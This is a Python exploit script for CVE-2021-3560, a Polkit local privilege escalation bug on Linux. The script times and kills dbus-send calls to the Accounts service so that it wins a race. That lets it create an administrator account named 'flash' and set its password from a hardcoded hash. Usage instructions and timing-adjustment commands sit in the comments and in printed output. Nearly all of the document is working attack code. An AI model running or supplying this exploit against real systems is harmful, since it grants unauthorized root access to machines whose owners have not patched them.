# Exploit Title: Polkit - Local Privilege Escalation
# Date: 11.06.2021
# Exploit Author: Salman Asad (@deathflash1411)
# Original Author: Kevin Backhouse (@kevin_backhouse)
# Version: Polkit version 0.113 (or later)
# Blog: https://deathflash.ml/blog/polkit-local-privilege-escalation
# Reference: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/
# Reference: https://www.youtube.com/watch?v=QZhz64yEd0g
# Reference: https://ubuntu.com/security/CVE-2021-3560
# CVE: 2021-3560
# Tested on: ubuntu-20.04.1-desktop (policykit-1 0.105-26ubuntu1)

# Note: If the exploit doesn't work run the below commands and change the usertime & passtime variables (half of real)
# time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:flash string:"deathflash1411" int32:1
# time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:'$5$HPVUSULZZ8BMl4wE$zisRakxfq9IDf7mY0FUteDiKtYYRjmGkf3RAUjFE2P2' string:GoldenEye

# Usage: python3 cve-2021-3560.py

import os
import pwd

banner = '''
##############CVE-2021-3560##############
# __________      .__   __   .__  __    #
# \______   \____ |  | |  | _|__|/  |_  #
#  |     ___/  _ \|  | |  |/ /  \   __\ #
#  |    |  (  <_> )  |_|    <|  ||  |   #
#  |____|   \____/|____/__|_ \__||__|   #
#                           \/          #
#   Local Privilege Escalation Exploit  #
# Author: Salman Asad (@deathflash1411) #
#########################################
'''
print(banner)

username = "flash"
# Generate password hash using `openssl passwd -5 flash`
password = "$5$HPVUSULZZ8BMl4wE$zisRakxfq9IDf7mY0FUteDiKtYYRjmGkf3RAUjFE2P2"
userinfo = "deathflash1411"
# Change these accordingly
usertime = "0.008s"
passtime = "0.005s"

def execute(command):
	os.system(command)	

while True:
	try:
		uid = pwd.getpwnam(username).pw_uid
		print("[+] User created!")
		print("[+] Username: " + username)
		print("[+] User ID: " + str(uid))
		print("[!] Run the below command a few times (<10) and login via su - " + username)
		print("\ndbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User" + str(uid) + " org.freedesktop.Accounts.User.SetPassword string:'$5$HPVUSULZZ8BMl4wE$zisRakxfq9IDf7mY0FUteDiKtYYRjmGkf3RAUjFE2P2' string:GoldenEye & sleep " + passtime + " ; kill $!")
		break
	except KeyError:
		execute('dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:' + username + ' string:' + userinfo + ' int32:1 & sleep ' + usertime + ' ; kill $! >/dev/null 2>&1')
